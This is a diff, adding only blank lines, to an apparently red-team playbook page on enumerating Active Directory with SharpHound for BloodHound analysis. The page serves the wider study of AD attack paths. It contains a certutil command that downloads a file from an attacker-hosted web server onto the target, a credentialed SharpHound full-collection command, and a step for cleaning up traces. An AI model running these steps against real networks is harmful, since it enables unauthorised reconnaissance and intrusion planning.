@@ -36,9 +36,15 @@ Use SharpHound to connect to an Active Directory environment and enumerate objec
 
 Use SharpHound to connect to an Active Directory environment and enumerate objects such as users, groups, ACLs, trusts, etc. This data then can be imported into BloodHound for analysis of objects, their relationships, and potential vulnerabilities. 
 
+
+
+
+
 ## Objectives
 
 SharpHound is a tool that is commonly used by both red and blue teams to enumerate objects in an Active Directory environment, including users, groups, ACLs, trusts, and other information. This information can be used by an attacker to gain a better understanding of the environment, identify potential attack paths, and plan their next steps.
+
+
 
 1. Transfer the sharphound tool to the target machine
 
@@ -48,13 +54,21 @@ SharpHound is a tool that is commonly used by both red and blue teams to enumera
 
 4. Clean up the sharphound tool and dump file.
 
+
+
 # Instructions
 
 1. Download the latest copy of SharpHound: [Download from GitHub](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors)
 
 2. Create a web server to host the file, then copy it to the target.
 
+
+
 On the attacker:
+
+
+
+
 
 **Command** ([[Launch a Python 3 Web Server]]):
 
@@ -62,7 +76,15 @@ On the attacker:
 python3 -m http.server $_PORT
 ```
 
+
+
+
+
 On the target:
+
+
+
+
 
 **Command** ([[Download from a Remote HTTP Server (certutil)]]):
 
@@ -70,13 +92,23 @@ On the target:
 certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" "$_PATH/$_FILENAME"
 ```
 
+
+
+
+
 3. Execute SharpHound.exe, specifying domain, user and password.
+
+
+
+
 
 **Command** ([[SharpHound Ingest AD Domain Information and Dump Results to File]]):
 
 ```bash
 SharpHound.exe -c All -d $_DOMAIN --ldapusername $_USER --ldappassword $_PASSWORD
 ```
+
+
 
 Note: While it may be less accurate, SharpHound can enumerate environments remotely from a non-domain joined computer by including the "-domaincontroller" argument with the DC's IP.
 
@@ -105,3 +137,5 @@ Note: While it may be less accurate, SharpHound can enumerate environments remot
 
 - [[Active Directory]]
 - [[Enumeration]]
+
+
